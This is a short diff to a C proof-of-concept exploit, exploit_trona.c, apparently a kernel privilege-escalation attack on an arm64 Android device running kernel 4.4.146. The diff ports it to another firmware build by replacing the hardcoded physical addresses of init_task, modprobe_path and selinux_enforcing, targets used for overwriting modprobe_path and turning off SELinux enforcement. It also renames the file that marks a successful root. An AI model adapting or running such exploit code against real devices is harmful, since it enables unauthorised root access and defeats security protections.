@@ -1,0 +1,30 @@
+diff --git a/poc-28663/exploit_trona.c b/poc-28663/exploit_trona.c
+index 7dc6bc6..61b759c 100644
+--- a/poc-28663/exploit_trona.c
++++ b/poc-28663/exploit_trona.c
+@@ -59,11 +59,11 @@ static __u64 KIMG_PHYS_BASE = 0x40080000ULL; /* kernel text physical base (argv[
+ #define MODPROBE_OFF        0x1669508ULL
+ /* Runtime-verified PAs for this firmware build (constant across boots;
+  * content-checked before use, hunts remain as fallback):
+- *   init_task 0x4173d740, modprobe_path 0x41745508,
+- *   selinux_enforcing 0x41969668 */
+-#define KNOWN_INIT_TASK_PA  0x4173d740ULL
+-#define KNOWN_MODPROBE_PA   0x41745508ULL
+-#define KNOWN_SELINUX_PA    0x41969668ULL
++ *   yacht: init_task 0x417ad400, modprobe_path 0x417b51c8,
++ *   selinux_enforcing 0x419e0668 */
++#define KNOWN_INIT_TASK_PA  0x417ad400ULL
++#define KNOWN_MODPROBE_PA   0x417b51c8ULL
++#define KNOWN_SELINUX_PA    0x419e0668ULL
+ 
+ /* task_struct / cred layout for this exact 4.4.146 arm64 build.
+  * init_task found via __primary_switched adrp+add -> msr sp_el0.
+@@ -580,7 +580,7 @@ static void prepare_root_files(void)
+ static int pwned(void)
+ {
+ 	char b[160];
+-	int fdx = open("/data/local/tmp/pwned", O_RDONLY);
++	int fdx = open("/data/local/tmp/pwned2", O_RDONLY);
+ 	if (fdx < 0) return 0;
+ 	int n = (int)read(fdx, b, sizeof(b) - 1);
+ 	close(fdx);
